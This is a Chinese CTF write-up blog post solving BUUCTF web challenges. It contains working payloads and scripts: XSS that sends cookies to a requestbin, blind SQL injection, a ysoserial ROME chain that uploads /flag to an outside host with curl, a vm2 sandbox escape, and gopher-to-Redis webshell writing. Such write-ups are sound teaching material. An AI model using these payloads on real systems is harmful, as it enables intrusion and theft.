---
title: "BUUCTF Web Writeup 11"
date: 2023-01-28T20:14:44+08:00
lastmod: 2023-01-28T20:14:44+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [FBCTF2019]Event

python 格式化字符串漏洞

[https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)

[https://www.anquanke.com/post/id/170620](https://www.anquanke.com/post/id/170620)

![image-20230105124441142](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051244215.png)

![image-20230105124534727](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051245760.png)

然后通过命名空间找到 flask app config

```python
__class__.__init__.__globals__
__class__.__init__.__globals__[app]
__class__.__init__.__globals__[app].config
```

注意这里中括号里面不能带引号, 原因如下

![image-20230105124737670](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051247844.png)

![image-20230105124755912](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051247012.png)

![image-20230105124820212](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051248258.png)

最后用 flask-unsign 构造 session

![image-20230105124844963](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051248176.png)

![image-20230105124903930](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051249015.png)

题目源码

[https://github.com/fbsamples/fbctf-2019-challenges/blob/main/web/events/app/app.py](https://github.com/fbsamples/fbctf-2019-challenges/blob/main/web/events/app/app.py)

![image-20230105125242507](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051252560.png)

最下面还有一个 `e.fmt.format(e)`

其实就是第一次格式化的 fmt 内容可控, 然后通过这个 fmt 第二次 format, 造成了字符串格式化漏洞

有一种二次注入的感觉

`0` 占位符表示的是 Event 对象

![image-20230105125335149](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051253176.png)

## [HFCTF 2021 Final]easyflask

```python
#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):
            u = b64decode(u.get('b'))
        u = pickle.loads(u)
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)
```

简单 pickle 反序列化

```
http://183edc6a-3426-40de-bef6-f395e53deb8e.node4.buuoj.cn:81/file?file=/proc/self/environ
```

![image-20230105142045706](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051420748.png)

构造 payload

![image-20230105142212865](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051422968.png)

![image-20230105142140005](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051421124.png)

![image-20230105142226550](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051422610.png)

![image-20230105142249467](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051422493.png)

## [网鼎杯 2020 青龙组]notes

```javascript
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');


var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});

app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
```

一眼原型链污染

undefsafe CVE-2019-10795

[https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940](https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)

![image-20230105162319558](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051623627.png)

![image-20230105162333248](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051623314.png)

![image-20230105162339802](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051623868.png)

![image-20230105162357786](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051623816.png)

## [CISCN2019 华东北赛区]Web2

注册登录发表文章, 有一个反馈的功能可以向管理员提交 url

一眼 xss, 但是发表文章的地方存在 csp, 并且过滤了一堆字符 (等于号 小括号 单双引号...)

csp 如下, 用跳转绕过就行

```html
<meta http-equiv="content-security-policy" content="default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval'">
```

xss 绕过的参考文章: [https://xz.aliyun.com/t/9606#toc-42](https://xz.aliyun.com/t/9606#toc-42)

原理是 svg 会以 xml 的标准来解析标签内部的内容, 而 xml 标准会解码 html 实体字符, 所以就可以绕过过滤造成 xss

简单搜了一下

[https://zh.wikipedia.org/wiki/%E5%8F%AF%E7%B8%AE%E6%94%BE%E5%90%91%E9%87%8F%E5%9C%96%E5%BD%A2](https://zh.wikipedia.org/wiki/%E5%8F%AF%E7%B8%AE%E6%94%BE%E5%90%91%E9%87%8F%E5%9C%96%E5%BD%A2)

https://www.runoob.com/svg/svg-intro.html

不难发现 svg 其实基于 xml

![image-20230110162003162](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101620197.png)

之前也遇到过 svg 造成 xxe 的例子

[https://zhuanlan.zhihu.com/p/323315064](https://zhuanlan.zhihu.com/p/323315064)

然后 xml 会解析 html 实体编码, 试一下就知道了

![image-20230110161913886](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101619931.png)

所以原理具体一点来说就是当 html 解析器识别到 svg 标签时, 会进入到 xml 解析环境, 先对 svg 标签里面的 html 实体字符进行解码, 然后识别到 script 标签, 进入 javascript 环境, 再去解析 js 语法

题目不出网, 所以用 buu requestbin 来获取 cookie (buu xss 平台目前好像无法注册?)

```html
<svg><script>location.href="http://http.requestbin.buuoj.cn/171h9361"</script></svg>
```

编码

```html
<svg><script>&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x68;&#x72;&#x65;&#x66;&#x3D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x68;&#x74;&#x74;&#x70;&#x2E;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x62;&#x69;&#x6E;&#x2E;&#x62;&#x75;&#x75;&#x6F;&#x6A;&#x2E;&#x63;&#x6E;&#x2F;&#x31;&#x37;&#x31;&#x68;&#x39;&#x33;&#x36;&#x31;&#x3F;&#x22;</script></svg>
```

跑一下验证码

```python
from hashlib import md5

for i in range(100000000):
    m = md5(str(i)).hexdigest()[0:6]
    # print(m) # 去掉这句再跑会快很多很多, 原因是 print 输出本身就会耗费大量的时间
    if m == '036413':
        print(i)
        exit()
```

![image-20230110160029875](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101600988.png)

![image-20230110160259408](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101602460.png)

之后访问 `/admin.php`, 查询处是个简单的 sql 注入

![image-20230110160405741](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101604778.png)

## [网鼎杯 2020 朱雀组]Think Java

`/swagger-ui.html` 泄露

![image-20230110193834136](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101938222.png)

附件中也有提示

![image-20230110195652536](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101956589.png)

然后 dbName 存在 sql 注入

![image-20230110193923233](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101939344.png)

因为 jdbc 的格式类似于 url, 所以可以用 url 中的 `#` 或者传入一个不存在的参数来防止连接数据库时报错

```mysql
myapp#' union select pwd from user #
myapp#' union select name from user #

myapp?a=' union select pwd from user #
myapp?a=' union select name from user #
```

![image-20230110194834546](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101948595.png)

![image-20230110194857141](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101948183.png)

登录后会返回 base64

![image-20230110195204387](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101952457.png)

这一串其实不是 jwt... 连个 `.` 都没有, 解密一下就会发现是 java 序列化后的数据

![image-20230110195252564](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101952725.png)

于是把 ysoserial 中的反序列化链子都试一遍, 发现是 ROME 链

```bash
java -jar ysoserial-all.jar ROME 'curl x.x.x.x:yyyy -T /flag' | base64 -w0
```

![image-20230110195438359](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301101954388.png)

最后引用一下网上 wp 中提到的 trick

> 一段数据以 `rO0AB` 开头, 你基本可以确定这串就是 Java 序列化 base64 加密的数据
>
> 或者如果以 `aced` 开头, 那么他就是这一段 Java 序列化的 16 进制

## [PwnThyBytes 2019]Baby_SQL

source.zip 源码泄露

index.php

```php
<?php
session_start();

foreach ($_SESSION as $key => $value): $_SESSION[$key] = filter($value); endforeach;
foreach ($_GET as $key => $value): $_GET[$key] = filter($value); endforeach;
foreach ($_POST as $key => $value): $_POST[$key] = filter($value); endforeach;
foreach ($_REQUEST as $key => $value): $_REQUEST[$key] = filter($value); endforeach;

function filter($value)
{
    !is_string($value) AND die("Hacking attempt!");

    return addslashes($value);
}

isset($_GET['p']) AND $_GET['p'] === "register" AND $_SERVER['REQUEST_METHOD'] === 'POST' AND isset($_POST['username']) AND isset($_POST['password']) AND @include('templates/register.php');
isset($_GET['p']) AND $_GET['p'] === "login" AND $_SERVER['REQUEST_METHOD'] === 'GET' AND isset($_GET['username']) AND isset($_GET['password']) AND @include('templates/login.php');
isset($_GET['p']) AND $_GET['p'] === "home" AND @include('templates/home.php');

?>
```

login.php

```php
<?php

!isset($_SESSION) AND die("Direct access on this script is not allowed!");
include 'db.php';

$sql = 'SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`="' . $_GET['username'] . '" and password="' . md5($_GET['password']) . '";';
$result = $con->query($sql);

function auth($user)
{
    $_SESSION['username'] = $user;
    return True;
}

($result->num_rows > 0 AND $row = $result->fetch_assoc() AND $con->close() AND auth($row['username']) AND die('<meta http-equiv="refresh" content="0; url=?p=home" />')) OR ($con->close() AND die('Try again!'));

?>
```

index.php 对 get post session 几个全局变量都做了 addslashes 处理, 无法 sql 注入

但是 login.php 中仅仅判断了 `isset($_SESSION)`, 如果存在任意一个 session 值就可以继续执行下去, 而下面的 get 全局变量并没有 addslashes, 所以在这里可以造成注入

不过有一个问题就是 login.php 开头没有 `session_start()`

[https://www.php.net/manual/zh/session.configuration.php](https://www.php.net/manual/zh/session.configuration.php)

![image-20230111181507808](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301111815895.png)

`session.auto_start` 配置默认也是不启动

然后找到了 `session.upload_progress`

![image-20230111181644916](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301111816963.png)

之前 session 反序列化或者 lfi 的时候都遇到过, 一般默认都是开启的

本地可以 `var_dump` 测试一下, 即便没有手动调用 `session_start();` 也还是能够填充 `$_SESSION` 变量

![image-20230111181904609](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301111819694.png)

sql 注入

![image-20230111182041906](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301111820995.png)

脚本如下

```python
import requests
import time

flag = ''

i = 1

while True:

    min = 32
    max = 127

    while min < max:
        time.sleep(0.2)
        mid = (min + max) // 2
        print(chr(mid))

        payload = '" or if(ascii(substr((select group_concat(secret) from flag_tbl),{},1))>{},1,0)%23'.format(i, mid)
        url = 'http://5444b2d7-028a-4a39-898e-4eb3356253ed.node4.buuoj.cn:81/templates/login.php?username={}&password=123'.format(payload)
        res = requests.post(url, files={'file': ('123', '456')},data={'PHP_SESSION_UPLOAD_PROGRESS': 'xxx'}, cookies={'PHPSESSID': '789'})
        if 'Try again!' not in res.text:
            min = mid + 1
        else:
            max = mid
    flag += chr(min)
    i += 1

    print('found', flag)
```

## [HITCON 2016]Leaking

```javascript
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {
    VM
} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function() {
    console.log("listening on port 3000!");
});
```

vm2 沙箱逃逸

这里有个很明显的问题, 因为题目并没有判断 `req.query.data` 具体是什么类型, 所以我们可以传一个 `?data[]=xxx`, 使它变成 Array, 然后 `req.query.data.length` 的结果就是 1, 绕过了长度限制, 后面在执行 `vm.run(req.query.data)` 时会将 `data` 隐式转换为 String, 这时候它的值就变成了 `xxx`

payload

[https://github.com/patriksimek/vm2/issues/225](https://github.com/patriksimek/vm2/issues/225)

```
http://4eb6eeb9-e40e-402c-89cc-d343be49f4dc.node4.buuoj.cn:81/?data[]=(function(){
        TypeError.prototype.get_process = f=>f.constructor("return process")();
        try{
                Object.preventExtensions(Buffer.from("")).a = 1;
        }catch(e){
                return e.get_process(()=>{}).mainModule.require("child_process").execSync("cat /app/config.js").toString();
        }
})()
```

然后看 wp 的时候发现了一个非常蛋疼的事情: 这条 issue 是 2019 年的, 但是题目是 2016 年的... 所以算是非预期了

[https://blog.z3ratu1.cn/%E5%88%B7%E9%A2%98%E5%88%B7%E9%A2%98.html](https://blog.z3ratu1.cn/%E5%88%B7%E9%A2%98%E5%88%B7%E9%A2%98.html)

[https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)

大概意思就是远古版本 nodejs 在使用 Buffer 时为其分配的内存没有被初始化, 也就是说可能蹦出来之前的内容 (? 不太懂)

```python
import requests
import re

while True:
    res = requests.get('http://4eb6eeb9-e40e-402c-89cc-d343be49f4dc.node4.buuoj.cn:81/?data[]=Buffer(9999)')
    print(res.text)
    flag = re.findall('flag\{[a-f0-9\-]*\}', res.text)
    if flag:
        print(flag)
        break
```

![image-20230111184600668](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301111846750.png)

## [网鼎杯 2020 玄武组]SSRFMe

```php
<?php
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;
}

function safe_request_url($url)
{

    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }

}
if(isset($_GET['url'])){
    $url = $_GET['url'];
    if(!empty($url)){
        safe_request_url($url);
    }
}
else{
    highlight_file(__FILE__);
}
// Please visit hint.php locally.
?>
```

简单 ssrf

```
http://df898ce0-1665-47c8-9681-f5fc0750fff5.node4.buuoj.cn:81/?url=http://0.0.0.0/hint.php
```

![image-20230111193207498](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301111932549.png)

用 gopher 打 redis, 简单写个脚本

```python
def urlencode(data):
    enc_data = ''
    for i in data:
        h = str(hex(ord(i))).replace('0x', '')
        if len(h) == 1:
            enc_data += '%0' + h.upper()
        else:
            enc_data += '%' + h.upper()
    return enc_data

payload = '''auth root
flushall
set k WEBSHELL
config set dir /var/www/html
config set dbfilename shell.php
save
quit'''

redis_payload = ''

for i in payload.split('\n'):
    arg_num = '*' + str(len(i.split(' ')))
    redis_payload += arg_num + '\r\n'
    for j in i.split(' '):
        arg_len = '$' + str(len(j))
        redis_payload += arg_len + '\r\n'
        redis_payload += j + '\r\n'

webshell = "<?php system($_GET[1]);?>"

redis_payload = redis_payload.replace('$8\r\nWEBSHELL', '$' + str(len(webshell)) + '\r\n' + webshell)

gopher_payload = 'gopher://0.0.0.0:6379/_' + urlencode(redis_payload)

print(gopher_payload)
```

burp 发送前需要再 urlencode 一次 (或者直接在脚本中再加一次 urlencode)

![image-20230111193242613](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301111932706.png)

![image-20230111193304049](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301111933121.png)

看 wp 的时候发现还是非预期了... buu 环境配置有问题

正解应该是 redis 主从复制 rce (4.x - 5.x)

[https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

[https://inhann.top/2021/09/14/redis_master_slave_rce/](https://inhann.top/2021/09/14/redis_master_slave_rce/)

[https://www.cnblogs.com/xiaozi/p/13089906.html](https://www.cnblogs.com/xiaozi/p/13089906.html)

redis 在主从复制时 slave 与 master 的通信如下

```bash
SLAVEOF 192.168.100.1 21000
+OK
PING
+PONG
REPLCONF listening-port 6379
+OK
REPLCONF capa eof capa psync2
+OK
PSYNC <40-bytes-data>
+FULLRESYNC <40-bytes-data> <raw-data>
```

可以看到 master 最后向 slave 发送 FULLRESYNC 执行全量同步的时候会带上 master 的 rdb 数据库 (raw data)

这时我们把 raw data 改成其它文件来发送, 就可以达到任意文件写的效果

本地用 poc 简单抓个包

![image-20230112152825647](C:\Users\exp10it\AppData\Roaming\Typora\typora-user-images\image-20230112152825647.png)

![image-20230112152821174](C:\Users\exp10it\AppData\Roaming\Typora\typora-user-images\image-20230112152821174.png)

然后 redis 从 4.0 开始支持导入自定义 module, 所以我们可以利用自定义的 module 来执行任意命令或者反弹 shell

[https://github.com/Dliv3/redis-rogue-server](https://github.com/Dliv3/redis-rogue-server)

[https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

整体思路就是先伪造主从复制的数据包将 `exp.so` 这个 redis module 传到目标机环境上, 再执行 `module load /path/to/exp.so` 导入 module, 最后调用 module 中的自定义函数执行命令

```bash
config set dir /tmp
config set dbfilename exp.so
slaveof x.x.x.x yyyy
slaveof no one
module load /tmp/exp.so
system.exec 'whoami'
```

大致就是这样, 但是 buu 的环境死活打不通, vps 根本没有连接传进来, 本地测试倒是没有任何问题...

## [NPUCTF2020]验证🐎

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = require('./key.js').keys;

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

function saferEval(str) {
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
    return null;
  }
  return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
  return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
  keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  req.session.admin = req.session.admin || 0;
  res.send(render(req.session.results = req.session.results || []))
});

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```

前面 first second 用 js 弱类型绕过没什么好说的

后面的正则限制了代码只能以 `Math.xx()` `123.123()` 这种形式来调用, 不能用 `Math.a.b()`, 而且限制了一堆符号, 不能用单双引号和反引号

参考文章: [https://alexzhong22c.github.io/2017/08/08/js-proto/](https://alexzhong22c.github.io/2017/08/08/js-proto/)

思路就是先通过 constructor 获得 Function 对象来定义函数, 然后利用弱类型得到 `String.fromCharCode` 方法绕过单双引号限制, 最后利用逗号运算符让表达式从左到右依次执行, 并用 IIFE 的形式调用函数

![image-20230112210200896](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301122102034.png)

之后还有一个问题, 因为 eval 默认使用当前上下文的命名空间来执行语句, 所以为了不让程序其他部分调用 Math 不出问题, 需要把这一串操作再套到一个箭头函数里面 (常规的匿名函数用法含有 function 关键字, 绕不过正则)

```javascript
return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')
```

```javascript
((Math)=>(Math=Math+1,Math=Math.constructor,Math.x=Math.constructor,Math.x(Math.fromCharCode(114,101,116,117,114,110,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math)
```

![image-20230112221134585](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301122211687.png)

## [CISCN2021 Quals]upload

index.php

```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="upload") {
    if ($_FILES['postedFile']['size'] > 1024*512) {
        die("这么大个的东西你是想d我吗？");
    }
    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);
    if ($imageinfo === FALSE) {
        die("如果不能好好传图片的话就还是不要来打扰我了");
    }
    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {
        die("东西不能方方正正的话就很讨厌");
    }
    $fileName=urldecode($_FILES['postedFile']['name']);
    if(stristr($fileName,"c") || stristr($fileName,"i") || stristr($fileName,"h") || stristr($fileName,"ph")) {
        die("有些东西让你传上去的话那可不得了");
    }
    $imagePath = "image/" . mb_strtolower($fileName);
    if(move_uploaded_file($_FILES["postedFile"]["tmp_name"], $imagePath)) {
        echo "upload success, image at $imagePath";
    } else {
        die("传都没有传上去");
    }
}
```

example.php

```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}
```

根据 example.php 的内容可以看出思路应该是先利用 index.php 上传 zip 文件,  然后去 example.php 解压缩, 最后绕过 png 二次渲染保存 php 文件至 /example 目录

[https://www.php.net/manual/zh/function.mb-strtolower](https://www.php.net/manual/zh/function.mb-strtolower)

![image-20230126162115544](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261622117.png)

`mb_strtolower('İ')` 的结果就是 `i`'

然后是 png 二次渲染绕过脚本

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

利用 xbm 图片的文件头可以绕过图片长宽限制 (实际上放在文件尾也能成功)

```
#define width 1
#define height 1
```

压缩后把上面这段内容插到 zip 注释里面

![image-20230126162636160](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261626236.png)

`İ` 需要 urlencode 一次, 因为 burp 会自动规范化某些字符

![image-20230126162734807](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261627899.png)

![image-20230126162915284](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301261629356.png)

最后 system 执行命令写一个 eval 马, 然后蚁剑连上去找 flag

